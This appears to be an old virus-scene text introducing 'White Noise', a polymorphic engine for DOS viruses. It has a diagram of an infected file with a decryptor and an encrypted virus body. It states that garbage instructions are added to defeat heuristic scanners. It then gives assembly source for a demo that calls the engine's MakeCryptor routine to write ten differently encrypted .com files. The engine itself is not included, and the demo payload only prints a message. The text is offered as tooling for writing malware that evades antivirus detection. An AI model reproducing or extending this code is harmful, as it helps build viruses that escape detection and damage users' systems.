
  White Noise - is a Polymorphic Engine.
  How it work ?
  Very simple :

            -----------------
            |      Jmp      |-----
            |---------------|    |
            |               |    |
            |   File Body   |    |
            |               |    |
            |---------------|    |
            |               | <---
            |   DeCryptor   |
            |               |
            |---------------|
            |               |
            |Encrypted Virus|
            |               |
            -----------------

  DeCryptor - as a 'one passed' lineal cycle, which decrypt a 'Encrypted
Virus' area. DeCryptor include not bad carbage, that allow not be
seeked by stupid heuristic analyzer.


It's a program sample, which use a "White Noise" to create a 10 files.
All this files encrypted.


.Model Tiny, Pascal
.Code
Locals
Jumps
.386
Extrn             Randomize:Near
Extrn             MakeCryptor:Near
                  Org      100h
Start:
                  Call     Randomize     ; initialize rnd digits generator
Loc1:
                  Push     Cs Cs
                  Pop      Ds Es
                  Mov      Cx,10
Loc_Loop:
                  Push     Cx

                  Mov      Di,OffSet Cryptor  ;
                  Mov      Cx, 40             ; Fill Cryptor area
                  Mov      Al,90h             ; by 'Nop' instructions
                  Cld                         ;
                  Rep      StosB              ;

; MakeCryptor (Param1, Param2, Param3)
; Word Param1 - length of area to crypt
; DWord Param2 - pointer, where create a crypt procedure
; DWord Param3 - pointer, where create decryptor
; Makecryptor return:
;       Cx: DeCryptor length in bytes
;       Al: byte, that used bellow to encrypt
;
                  Call     MakeCryptor Pascal, MyProgLen  \
                                       Cs OffSet Cryptor1 \
                                       Cs OffSet Instructions

                  Mov      Cs:CryptInit,Al
                  Jmp      Short $+2         ; clear ---
                                             ;         |
                  Mov      Cs:ILength,Cx     ;         |
                  Mov      Cx,MyProgLen      ;         |
                  Lea      Si,MyProg         ;         |
                  Lea      Di,MyProgTmp      ;         |
                  Mov      Bl,0              ;         |
                  Org      $-1               ; <-------|
CryptInit         DB       0
                  Dec      Bl
Loc1_Fuck:
                  LodsB
                  Call     Cryptor
                  StosB
                  Loop     Loc1_Fuck

                  Push     Cs
                  Pop      Ds
                  Mov      Ah,3Ch
                  Lea      Dx,Path
                  Xor      Cx,Cx
                  Int      21h
                  Jc       Fuck
                  Xchg     Ax,Bx
                  Mov      Ah,40h
                  Lea      Dx,Instructions
                  Mov      Cx,Word Ptr Cs:ILength
                  Int      21h

                  Mov      Ah,40h
                  Mov      Cx,MyProgLen
                  Lea      Dx,MyProgTmp
                  Int      21h

                  Mov      Ah,3Eh
                  Int      21h
                  Inc      Cs:Path1
                  Pop      Cx
                  Loop     Loc_Loop
Fuck:
                  ExitCode 0

ILength           DW       0
Path              DB       'rnd'
Path1             DB       '0'
                  DB       '.com',0
CInstruction      DB       300 Dup (0)

Cryptor:
                  DB       39 Dup (90h)
Cryptor1:
                  Nop
                  Ret

MyProg:
                  Call     _Loc1
_Loc1:
                  Pop      Dx
                  Add      Dx,OffSet Msg1-OffSet _Loc1
                  Mov      Ah,9
                  Int      21h
                  Int      20h
Msg1              DB       'Jedem das sein ;-)',13,10,'$'
MyProgLen         EQU      $-MyProg

MyProgTmp         DB       MyProgLen Dup(0)

Instructions      DB       7000 Dup (?)

                  End      Start
